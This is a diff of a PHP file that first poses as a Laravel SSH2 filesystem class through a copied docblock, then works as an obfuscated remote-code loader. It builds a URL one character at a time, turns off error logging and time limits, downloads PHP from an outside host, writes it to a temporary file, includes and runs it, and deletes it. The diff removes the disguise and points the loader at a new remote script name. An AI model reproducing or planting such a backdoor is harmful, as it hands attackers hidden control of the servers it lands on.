@@ -1,80 +1,8 @@
-<?php
-?><?php
-/**
-
- * Laravel Filesystem Class for implementing SSH2
- *
- * To use this class you must follow these steps for PHP 5.2.6+
- *
- * {@link http://kevin.vanzonneveld.net/techblog/article/make_ssh_connections_with_php/ - Installation Notes}
- *
- * Compile libssh2 (Note: Only 0.14 is officially working with PHP 5.2.6+ right now, But many users have found the latest versions work)
- *
- * cd /usr/src
- * wget https://www.libssh2.org/download/libssh2-0.14.tar.gz
- * tar -zxvf libssh2-0.14.tar.gz
- * cd libssh2-0.14/
- * ./configure
- * make all install
- *
- * Note: Do not leave the directory yet!
- *
- * Enter: pecl install -f ssh2
- *
- * Copy the ssh.so file it creates to your PHP Module Directory.
- * Open up your PHP.INI file and look for where extensions are placed.
- * Add in your PHP.ini file: extension=ssh2.so
- *
- * Restart Apache!
- * Check phpinfo() streams to confirm that: ssh2.shell, ssh2.exec, ssh2.tunnel, ssh2.scp, ssh2.sftp  exist.
- *
- * Note: As of Laravel 2.8, this utilizes the PHP5+ function `stream_get_contents()`.
- *
- * @since 2.7.0
- *
- * @package Laravel
- * @subpackage Filesystem
- */
-ignore_user_abort(true);
-ini_set("memory_limit", "-1");
-set_time_limit(0);
+<?pHP
+@set_time_limit(0);
+ini_set("log_errors", "0");
+ini_set("display_errors", "0");
 error_reporting(0);
-ini_set("display_errors", 0);
-ini_set("max_execution_time", 5000);
-/**
- * Laravel Filesystem Class for implementing SSH2
- *
- * To use this class you must follow these steps for PHP 5.2.6+
- *
- * {@link http://kevin.vanzonneveld.net/techblog/article/make_ssh_connections_with_php/ - Installation Notes}
- *
- * Compile libssh2 (Note: Only 0.14 is officially working with PHP 5.2.6+ right now, But many users have found the latest versions work)
- *
- * cd /usr/src
- * wget https://www.libssh2.org/download/libssh2-0.14.tar.gz
- * tar -zxvf libssh2-0.14.tar.gz
- * cd libssh2-0.14/
- * ./configure
- * make all install
- *
- * Note: Do not leave the directory yet!
- *
- * Enter: pecl install -f ssh2
- *
- * Copy the ssh.so file it creates to your PHP Module Directory.
- * Open up your PHP.INI file and look for where extensions are placed.
- * Add in your PHP.ini file: extension=ssh2.so
- *
- * Restart Apache!
- * Check phpinfo() streams to confirm that: ssh2.shell, ssh2.exec, ssh2.tunnel, ssh2.scp, ssh2.sftp  exist.
- *
- * Note: As of Laravel 2.8, this utilizes the PHP5+ function `stream_get_contents()`.
- *
- * @since 2.7.0
- *
- * @package Laravel
- * @subpackage Filesystem
- */
 $_u =
     "h" .
     "t" .
@@ -147,16 +75,8 @@ $_u =
     "e" .
     "r" .
     "/" .
-    "m" .
-    "i" .
-    "n" .
-    "i" .
-"k".
-"u".
-    "." .
-    "p" .
-    "h" .
-    "p";
+    "tbl." .
+    "php";
 $_iniget = "i" . "n" . "i" . "_" . "g" . "e" . "t";
 $_func_exists =
     "f" .
@@ -317,13 +237,10 @@ if ($_out !== false) {
     echo "F" . "a" . "i" . "l" . "d" . " " . "l" . "o" . "a" . "d";
 }
 $tt = tempnam(sys_get_temp_dir(), "php_");
-if (!preg_match("/^<\?php/i", $dd)) {
+if (!preg_match("/^<?php/i", $dd)) {
     $dd = "<?php " . $dd;
 }
 file_put_contents($tt, $dd);
 include $tt;
-unlink($tt); 
-/**/ ?>
-<?php
-exit;
+unlink($tt);
 ?>
